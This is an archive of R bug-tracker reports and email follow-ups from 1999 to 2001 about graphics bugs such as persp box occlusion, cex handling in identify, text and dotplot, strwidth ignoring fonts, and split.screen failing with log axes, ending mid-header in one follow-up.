From: wsi@gcal.ac.uk
Date: Wed, 2 Jun 1999 15:02:03 +0200 (MET DST)
--The persp algorithm does not apply the occlusion rules to the frame, 
--which is always plotted first. 
--A bug, but not very simple to fix.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 202 <==
From wsi@gcal.ac.uk  Wed Jun  2 15:02:10 1999
Received: from localhost (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA27126
	for <R-bugs@biostat.ku.dk>; Wed, 2 Jun 1999 15:02:03 +0200 (MET DST)
Date: Wed, 2 Jun 1999 15:02:03 +0200 (MET DST)
From: wsi@gcal.ac.uk
Message-Id: <199906021302.PAA27126@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: persp box occlusion bug

Full_Name: Bill Simpson
Version: 64.1
OS: linux
Submission from: (NULL) (193.62.250.209)


Bug in persp() bounding box:
If the surface being plotted extends below the lower z-axis boundary, the box
is
drawn with the wrong occlusion. The box is shown as being occluded by the
surface
even though it should be in front of the surface.

The box is correct for surface extending above the box. Problem is only for
surface extending below the box.

This exhibits the bug:

std<-rep(seq(-32,32,8),9)/1000 * 60
cf<-rep(seq(-32,32,8),rep(9,9))/1000 *60 
dp<-(cf-std)/.6
std<-unique(std)
cf<-unique(cf)
dp<-t(matrix(dp,length(cf),length(std)))
persp(std,cf,dp, xlim=c(-2,2), ylim=c(-2,2), zlim=c(0,5),theta=-40,    
phi=45,
box=TRUE,ltheta=-120, lphi=120,
d=1.5, shade=.7)


==> 202.audit <==
Wed Jun 30 19:31:18 1999	pd	moved from incoming to Graphics
Thu Jul 01 18:19:48 1999	pd	changed notes
Sun Feb 20 10:07:11 2000	ripley	changed notes
Mon Feb 28 17:17:51 2000	pd	changed notes
Mon Feb 28 17:18:28 2000	pd	changed notes
Mon Feb 28 17:19:35 2000	pd	changed notes
Mon Feb 28 17:20:17 2000	pd	changed notes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 660 *
Subject: identify.default ignores any setting of cex.
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
Date: Fri, 15 Sep 2000 10:23:39 +0100 (BST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 660 <==
From postmaster@franz.stat.wisc.edu  Fri Sep 15 11:23:32 2000
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA13327
	for <R-bugs@biostat.ku.dk>; Fri, 15 Sep 2000 11:23:32 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id LAA17846
	for <r-bugs@hypatia.math.ethz.ch>; Fri, 15 Sep 2000 11:23:49 +0200 (MET DST)
Received: from franz.stat.wisc.edu(128.105.174.95)
 via SMTP by hypatia, id smtpdAAAa004Mn; Fri Sep 15 11:23:42 2000
Received: from toucan.stats.ox.ac.uk (really [163.1.20.20]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m13Zrkl-000IW0C@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <R-bugs@r-project.org>; Fri, 15 Sep 2000 04:25:51 -0500 (CDT) 
Received: from localhost (ripley@localhost)
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA14892
	for <R-bugs@r-project.org>; Fri, 15 Sep 2000 10:23:39 +0100 (BST)
X-Authentication-Warning: toucan.stats: ripley owned process doing -bs
Date: Fri, 15 Sep 2000 10:23:39 +0100 (BST)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-Sender: ripley@toucan.stats
To: R-bugs@r-project.org
Subject: identify.default ignores any setting of cex.
Message-ID: <Pine.GSO.4.05.10009151011510.14885-100000@toucan.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

R 1.1.1 on Windows, but I think this is widespread.

Using either

par(cex=0.5)
plot(1:10)
identify(1:10)

or

plot(1:10)
identify(1:10, cex=0.5)

ignores the cex setting.  The root cause is that par(cex=0.5)
alters cexbase for the device but sets cex=1.0, and the internal
text plotting routines use cex and not cexbase.

The obvious fix is to set cex to cexbase in do_identify. However,
if this is fixed, there is another problem, The offset of the label
is related to the cex in use for the label, and not for the symbol.
So

plot(1:10, type="n")
points(1:10, cex=5)
identify(1:10)

is not sensible in placing the labels.  That may be hard to anticipate,
but 

plot(1:10)
identify(1:10, cex=0.5)

needs to use cex=1 not cex=0.5 for the adjustment.  Perhaps identify is
trying too hard, and should give the user more control over the precise
position of the label (as S-PLUS does).

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 660.audit <==
Wed Oct 25 06:57:35 2000	ripley	moved from incoming to Graphics

==> 660.followup.1 <==
From ligges@statistik.uni-dortmund.de  Wed Apr 25 17:24:42 2001
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA02114
	for <R-bugs@biostat.ku.dk>; Wed, 25 Apr 2001 17:24:42 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Wed, 25 Apr 2001 17:24:51 +0200
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.9.3+Sun/8.9.3) with ESMTP id RAA01760;
	Wed, 25 Apr 2001 17:24:50 +0200 (MET DST)
Message-ID: <3AE6EC55.6C1D8C7A@statistik.uni-dortmund.de>
Date: Wed, 25 Apr 2001 17:25:09 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
X-Mailer: Mozilla 4.76 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs <R-bugs@biostat.ku.dk>
CC: "Brian D. Ripley" <ripley@stats.ox.ac.uk>
Subject: Re: identify.default ignores any setting of cex (PR#660)
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

A follow-up to PR#660 (15 Sep 2000) from Brian Ripley:

> R 1.1.1 on Windows, but I think this is widespread.
>
> Using either
>
> par(cex=0.5)
> plot(1:10)
> identify(1:10)
>
> or
> 
> plot(1:10)
> identify(1:10, cex=0.5)
> 
> ignores the cex setting.  The root cause is that par(cex=0.5)
> alters cexbase for the device but sets cex=1.0, and the internal
> text plotting routines use cex and not cexbase.
> 
> The obvious fix is to set cex to cexbase in do_identify. However,
> if this is fixed, there is another problem, The offset of the label
> is related to the cex in use for the label, and not for the symbol.
> So
> 
> plot(1:10, type="n")
> points(1:10, cex=5)
> identify(1:10)
> 
> is not sensible in placing the labels.  That may be hard to anticipate,
> but 
> 
> plot(1:10)
> identify(1:10, cex=0.5)
> 
> needs to use cex=1 not cex=0.5 for the adjustment.  Perhaps identify is
> trying too hard, and should give the user more control over the precise
> position of the label (as S-PLUS does).


The same with 

 par(cex=1); plot(1:10); text(4, 5, "Hello World") # OK
 par(cex=2); plot(1:10); text(4, 5, "Hello World") # OK
 par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 1) # NOT OK
 par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 0.5)

So the scaling with cex in text() is relative to the par() settings,
which is not the expected behaviour.


[R-1.2.2 on WinNT 4.0]

Uwe Ligges

==> 660.followup.2 <==
From ripley@stats.ox.ac.uk  Wed Apr 25 20:00:09 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA03187
	for <R-bugs@biostat.ku.dk>; Wed, 25 Apr 2001 20:00:09 +0200 (MET DST)
Received: from max166.public.ox.ac.uk (max166.public.ox.ac.uk [192.76.27.166])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id SAA06061;
	Wed, 25 Apr 2001 18:56:30 +0100 (BST)
Date: Wed, 25 Apr 2001 18:55:47 +0100 (GMT Daylight Time)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
To: <ligges@statistik.uni-dortmund.de>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Re: identify.default ignores any setting of cex (PR#660)
In-Reply-To: <200104251524.RAA02124@pubhealth.ku.dk>
Message-ID: <Pine.WNT.4.31.0104251852500.300-100000@tern.stats>
Sender: ripley@stats.ox.ac.uk
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Wed, 25 Apr 2001 ligges@statistik.uni-dortmund.de wrote:

> A follow-up to PR#660 (15 Sep 2000) from Brian Ripley:

[...]

> The same with
>
>  par(cex=1); plot(1:10); text(4, 5, "Hello World") # OK
>  par(cex=2); plot(1:10); text(4, 5, "Hello World") # OK
>  par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 1) # NOT OK
>  par(cex=2); plot(1:10); text(4, 5, "Hello World", cex = 0.5)
>
> So the scaling with cex in text() is relative to the par() settings,
> which is not the expected behaviour.

It is the documented behaviour, though: see the description of cex in
?help.

     cex: numeric character expansion factor; multiplied by
          `par("cex")' yields the final character size.

Brian

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 776 *
Subject: strwidth does not take font into account
From: Martyn Plummer <plummer@iarc.fr>
Date: Tue, 19 Dec 2000 14:56:01 +0100 (CET)
--This needs a substantial redesign.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 776 <==
From postmaster@franz.stat.wisc.edu  Tue Dec 19 14:53:40 2000
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA05819
	for <r-bugs@biostat.ku.dk>; Tue, 19 Dec 2000 14:53:39 +0100 (MET)
Received: from smtp02.iarc.fr (really [212.157.236.234]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m148NHG-000IYiC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Tue, 19 Dec 2000 07:58:02 -0600 (CST) 
Received: from xena.iarc.fr ([10.10.150.125])
	by smtp02.iarc.fr (8.9.3/8.9.3) with ESMTP id OAA21720
	for <r-bugs@r-project.org>; Tue, 19 Dec 2000 14:53:55 +0100
Message-ID: <XFMail.001219145601.plummer@iarc.fr>
X-Mailer: XFMail 1.3 [p0] on Linux
X-Priority: 3 (Normal)
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 8bit
MIME-Version: 1.0
Date: Tue, 19 Dec 2000 14:56:01 +0100 (CET)
Organization: International Agency for Research on Cancer
Sender: martyn@xena.iarc.fr
From: Martyn Plummer <plummer@iarc.fr>
To: r-bugs@r-project.org
Subject: strwidth does not take font into account

One for the wishlist.

The text() function permits the use of different fonts with the arguments
"font" or "vfont".  These create text strings of the same height as the
default font, but of different widths: bold face is slightly wider; vector
fonts are usually much wider.  I think the strwidth() function needs to
take the font into account by also having "font" and "vfont" arguments.
Currently it reports the string width using the default font, which can
be quite different.

Here is a little test function you can use to see how far off the
reported string width is.

test.strwidth <-
function(text, vfont=NULL, cex=NULL, ...)
{
 plot(0,0,xlim=c(-1,1),ylim=c(-1,1), type="n")
 text(0,0, text, adj=c(0,0), offset=0, cex=cex, vfont=vfont, ...)
 abline(h=c(0, strheight(text, cex=cex)), lty=2)
 abline(v=c(0, strwidth(text, cex=cex)), lty=2)
}

e.g.

test.strwidth("This is some text", cex=2)
test.strwidth("This is some text", cex=2, font=2)
test.strwidth("This is some text", vfont=c("sans serif", "plain"))

Martyn

Please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status =
 major = 1
 minor = 2.0
 year = 2000
 month = 12
 day = 15
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base




==> 776.audit <==
Tue Dec 26 10:31:10 2000	ripley	moved from incoming to Graphics
Sat Feb 24 08:55:28 2001	ripley	changed notes
Sat Feb 24 08:55:28 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 791 *
Subject:  par(lab= *) / axis(*) bug 
From: maechler@stat.math.ethz.ch
Date: Fri, 22 Dec 2000 10:59:26 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 791 <==
From postmaster@franz.stat.wisc.edu  Fri Dec 22 10:59:23 2000
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA08619
	for <r-bugs@biostat.ku.dk>; Fri, 22 Dec 2000 10:59:23 +0100 (MET)
Received: from stat.math.ethz.ch (really [129.132.58.23]) by franz.stat.wisc.edu
	via in.smtpd with esmtp (ident daemon using rfc1413)
	id <m149OzA-000IXMC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Fri, 22 Dec 2000 03:59:36 -0600 (CST) 
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id KAA02617;
	Fri, 22 Dec 2000 10:59:34 +0100 (MET)
Received: from UNKNOWN(129.132.58.33), claiming to be "florence.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa000cp; Fri Dec 22 10:59:26 2000
Received: (maechler@localhost) by florence.ethz.ch (8.9.3/D-MATH-client) id KAA23075; Fri, 22 Dec 2000 10:59:26 +0100
Date: Fri, 22 Dec 2000 10:59:26 +0100
From: maechler@stat.math.ethz.ch
Message-Id: <200012220959.KAA23075@florence.ethz.ch>
To: r-bugs@r-project.org
Subject:  par(lab= *) / axis(*) bug 
Cc: maechler@stat.math.ethz.ch

As the subject says,
here is example code (with comments) showing the problem:

p1 <- function(lab = c(8,12,7))
{
    ## This `fails' (on a virgin device)
    clab <- paste(lab,collapse=",")
    plot(1,1, xlim = c(0,15), ylim = c(-.8,1), type ="n", axes = FALSE,
         main=paste("plot(*,axes=F); par(lab= c(",clab,"));  axis(*) x 2",sep=""))
    box(col="gray80")
    op <- par(lab = lab) ; on.exit(par(op))
    axis(1, pos = 0)
    axis(2, pos = 0, las = 1)
    par(op)
    op
}

p2 <- function(lab = c(8,12,7))
{
    ## This works  [par()  *BEFORE*  plot() ]
    clab <- paste(lab,collapse=",")
    op <- par(lab = lab) ; on.exit(par(op))

    plot(1,1, xlim = c(0,15), ylim = c(-.8,1), type ="n", axes = FALSE,
         main=paste("par(lab= c(",clab,")); plot(*,axes=F); axis(*) x 2",sep=""))
    box(col="gray80")
    axis(1, pos = 0)
    axis(2, pos = 0, las = 1)
    op ## lab 5 5 7
}

dev.off()
par(mfrow=c(2,1), mar=c(2,2,3,1))
p1()
p2()




--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = Patched
 major = 1
 minor = 2.0
 year = 2000
 month = 12
 day = 19
 language = R

Search Path:
 .GlobalEnv, package:nls, package:splines, package:lqs, package:modreg, package:stepfun, package:mva, package:eda, package:ts, package:VLMC, package:ctest, package:SfS, Autoloads, package:base

==> 791.audit <==
Tue Dec 26 10:31:10 2000	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 816 *
Subject: dotplot: character size of labels
From: RINNER Heinrich <H.RINNER@TIROL.GV.AT>
Date: Thu, 18 Jan 2001 14:54:32 +0100
--Suggested fix is incorporated in 1.2.2.
--
--There is a deeper problem:  mtext() ignores par(cex=.5) in general.  
--To see the problem try:  par(cex=.5); mtext("hi")
--Paul thinks the right fix is to change the argument list for mtext so that
--cex=par(cex) by default rather than cex=NA by default (plus corresponding
--internal changes to  do_mtext in plot.c).
--This needs to be done very carefully because (i) the change suggested above 
--mayhave side-effects in many other pieces of interpreted code 
--(ii) do_mtext ignores dd->gp.cexbase unlike, for example, do_plot_xy 
--and anything to do with cexbase needs extreme care.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 816 <==
From postmaster@franz.stat.wisc.edu  Thu Jan 18 16:57:16 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA13627
	for <r-bugs@biostat.ku.dk>; Thu, 18 Jan 2001 16:57:15 +0100 (MET)
Received: from ingw1.tirol.gv.at (really [212.183.27.1]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m14JHRE-000IWyC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Thu, 18 Jan 2001 09:57:24 -0600 (CST) 
Received: from xms.tirol.gv.at (xms.tirol.gv.at [10.11.128.200])
	by ingw1.tirol.gv.at (Mailer) with ESMTP id 22ADE2825
	for <r-bugs@r-project.org>; Thu, 18 Jan 2001 14:49:47 +0100 (NFT)
Received: from xms.tirol.gv.at (unverified) by xms.tirol.gv.at
 (Content Technologies SMTPRS 4.1.5) with ESMTP id <T0a0b80c8512ecf1400@xms.tirol.gv.at> for <r-bugs@r-project.org>;
 Thu, 18 Jan 2001 14:54:33 +0100
Received: by xms.tirol.gv.at with Internet Mail Service (5.5.2650.21)
	id <CLGLQ6B7>; Thu, 18 Jan 2001 14:54:33 +0100
Message-ID: <C4D44AB4CB62D311BA6500041202E8862640F8@xms1.tirol.gv.at>
From: RINNER Heinrich <H.RINNER@TIROL.GV.AT>
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Subject: dotplot: character size of labels
Date: Thu, 18 Jan 2001 14:54:32 +0100
Return-Receipt-To: RINNER Heinrich <H.RINNER@TIROL.GV.AT>
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id QAA13627

There seems to be a bug in "dotplot" concerning the "cex" parameter. Setting
cex has no effect on the character size of the labels of the points.
This problem was posted to r-help today (Thu, 18 Jan 2001); the solution
given by Brian Ripley (and Uwe Ligges) seems to work for me.

Heinrich Rinner.
 
> version
         _              
platform i386-pc-mingw32
arch     x86            
os       Win32          
system   x86, Win32     
status                  
major    1              
minor    2.0            
year     2000           
month    12             
day      15             
language R              

> ----------
> Von: 	Prof Brian Ripley[SMTP:ripley@stats.ox.ac.uk]
> Gesendet: 	Donnerstag, 18. Jänner 2001 10:35
> An: 	RINNER Heinrich
> Cc: 	'r-help@stat.math.ethz.ch'
> Betreff: 	Re: [R] dotplot: character size of labels
> 
> On Thu, 18 Jan 2001, RINNER Heinrich wrote:
> 
> > Dear R users,
> >
> > using dotplot (R1.2.0, WinNT4.0), I am trying to change the character
> size
> > of the labels of the points:
> >
> > > # example
> > > data(VADeaths)
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940")
> > > # I'd like to have smaller character size of the labels (for age and
> > population groups)
> > > ?dotplot
> > > # for argument "cex", this says: "Setting cex to a value smaller than
> one
> > can be a useful way of avoiding label overlap."
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940", cex = 0.5)
> > > # the main title and the plotting characters are smaller now, but not
> the
> > labels
> > > # trying to set other graphics parameters seems to have no effect:
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940", cex.axis =
> 0.5)
> > > dotplot(VADeaths, main = "Death Rates in Virginia - 1940", cex.lab =
> 0.5)
> >
> > I'd be grateful for any hint how to do this correctly;
> 
> Looks like a bug. Inside dotplot alter to
> 
>         for (i in 1:n) mtext(labs[i], side = 2, line = loffset,
>             at = y[i], adj = 0, col = color, las = 2, cex = cex, ...)
> 
>         for (i in 1:nlevels(groups)) mtext(glabels[i], side = 2,
>             line = goffset, at = gpos[i], adj = 0, col = gcolor,
>             las = 2, cex = cex, ...)
> 
> However, it really needs more than that to calculate the spaces for the
> labels correctly.
> 
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 

==> 816.audit <==
Sat Jan 20 10:24:14 2001	ripley	moved from incoming to Graphics
Tue Jan 23 03:38:23 2001	paul	changed notes
Tue Jan 23 03:38:23 2001	paul	foobar
Sun Feb 18 10:11:12 2001	ripley	changed notes
Sun Feb 18 10:11:12 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 831 *
Subject: screen can't go back to (split) screen with log="y" plot
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 30 Jan 2001 00:39:41 -0500
--Still there. Suggested fix included in followups, but we didn't get around to
--try it in time for 1.2.3.
--
--Fix doesn't work. One problem is that the opar<-par();par(opar) idiom updates
--xaxp before xlog, and the new value of xaxp may only be valid under the new
--value of xlog.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 831 <==
From postmaster@franz.stat.wisc.edu  Tue Jan 30 06:39:31 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA28455
	for <r-bugs@biostat.ku.dk>; Tue, 30 Jan 2001 06:39:30 +0100 (MET)
Received: from infiniti.ece.cmu.edu (really [128.2.216.84]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m14NTW2-000IWyC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Mon, 29 Jan 2001 23:39:42 -0600 (CST) 
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id AAA26672; Tue, 30 Jan 2001 00:39:42 -0500
X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: r-bugs@r-project.org
Cc: Thomas Vogels <tov@ece.cmu.edu>
Subject: screen can't go back to (split) screen with log="y" plot
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
Date: 30 Jan 2001 00:39:41 -0500
Message-ID: <pxsnm1egyq.fsf@infiniti.ece.cmu.edu>
Lines: 76
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Hi.  Let's try to explain the subject line with some code:

> split.screen (c(2,1))
[1] 1 2
> screen(1)
> plot (1:2, 1:2, log="y", main="1")
> screen (2)
> plot (1:2, 1:2, main="2")
> screen (1)
Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".
> close.screen(all=TRUE)

Let's add comments:

> split.screen (c(2,1))
[1] 1 2

OK, plot in the top half screen:
> screen(1)
> plot (1:2, 1:2, log="y", main="1")
> par("yaxp")
[1]  1  2 -5

OK, switch to bottom half:
> screen (2)
> plot (1:2, 1:2, main="2")
> par("yaxp")
[1] 1 2 5

OK, looks fine, let's go back up:
> screen (1)
Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".

Bummer.
> close.screen(all=TRUE)

Somehow I'm hoping you'll tell me I'm doing something wrong, because
I'd really would like to be able to do the following:
  repeat {
    #calculate
    screen(1)
    #fancy plot
    screen (2)
    #even fancier plot ;-)
    if (user.bored()) break
  }
Which is roughly what I was doing when the error messages started
popping up.

Thanks,
  -tom

--please do not edit the information below--

Version:
 platform = i386-pc-linux-gnu
 arch = i386
 os = linux-gnu
 system = i386, linux-gnu
 status = 
 major = 1
 minor = 2.1
 year = 2001
 month = 01
 day = 15
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base



-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204


==> 831.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Jan 30 08:40:46 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA28901
	for <R-bugs@biostat.ku.dk>; Tue, 30 Jan 2001 08:40:46 +0100 (MET)
Received: from max144.public.ox.ac.uk (max144.public.ox.ac.uk [192.76.27.144])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id HAA21509;
	Tue, 30 Jan 2001 07:40:54 GMT
Date: Tue, 30 Jan 2001 07:39:25 +0000 (GMT)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: <ripley@auk.stats>
To: <tov@ece.cmu.edu>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] screen can't go back to log="y" plot (PR#831)
In-Reply-To: <200101300539.GAA28465@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.31.0101300725290.17104-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

[I have abbreviated the subject as jitterbug has been having probems
with long subjects.]

The issue here is that one cannot mix log/non-log axes in the calls to
screen(), as the appropriate par() parameter is read-only, but the
meaning of yaxp depends on it.  But beyond that you can't set
x/yaxp for log axes.

You should be able to do this: you can in the S original.

A simpler version:

plot (1:2, 1:2, log="y", main="1")
zz <- par("yaxp")
zz
[1]  1  2 -5
par(yaxp=zz)
Error in par(yaxp = zz) : invalid value specified for graphics parameter
"yaxp".

So you can't reset the yaxp parameter to what it is reported as!


Additional bug: the meaning of x/yaxp for log axes is not defined
in help(par).


On Tue, 30 Jan 2001 tov@ece.cmu.edu wrote:

>
> Hi.  Let's try to explain the subject line with some code:
>
> > split.screen (c(2,1))
> [1] 1 2
> > screen(1)
> > plot (1:2, 1:2, log="y", main="1")
> > screen (2)
> > plot (1:2, 1:2, main="2")
> > screen (1)
> Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".
> > close.screen(all=TRUE)
>
> Let's add comments:
>
> > split.screen (c(2,1))
> [1] 1 2
>
> OK, plot in the top half screen:
> > screen(1)
> > plot (1:2, 1:2, log="y", main="1")
> > par("yaxp")
> [1]  1  2 -5
>
> OK, switch to bottom half:
> > screen (2)
> > plot (1:2, 1:2, main="2")
> > par("yaxp")
> [1] 1 2 5
>
> OK, looks fine, let's go back up:
> > screen (1)
> Error in par(.split.screens[[n]]) : invalid value specified for graphics parameter "yaxp".
>
> Bummer.
> > close.screen(all=TRUE)
>
> Somehow I'm hoping you'll tell me I'm doing something wrong, because
> I'd really would like to be able to do the following:
>   repeat {
>     #calculate
>     screen(1)
>     #fancy plot
>     screen (2)
>     #even fancier plot ;-)
>     if (user.bored()) break
>   }
> Which is roughly what I was doing when the error messages started
> popping up.
>
> Thanks,
>   -tom
>
> --please do not edit the information below--
>
> Version:
>  platform = i386-pc-linux-gnu
>  arch = i386
>  os = linux-gnu
>  system = i386, linux-gnu
>  status =
>  major = 1
>  minor = 2.1
>  year = 2001
>  month = 01
>  day = 15
>  language = R
>
> Search Path:
>  .GlobalEnv, package:ctest, Autoloads, package:base
>
>
>
> --
> mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 831.followup.2 <==
From tov@ece.cmu.edu  Thu Feb  1 02:13:08 2001
Received: from infiniti.ece.cmu.edu (INFINITI.ECE.CMU.EDU [128.2.133.84])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA25173
	for <R-bugs@biostat.ku.dk>; Thu, 1 Feb 2001 02:13:07 +0100 (MET)
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id UAA19026; Wed, 31 Jan 2001 20:12:41 -0500
X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] screen can't go back to log="y" plot (PR#831)
References: <Pine.GSO.4.31.0101300725290.17104-100000@auk.stats>
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
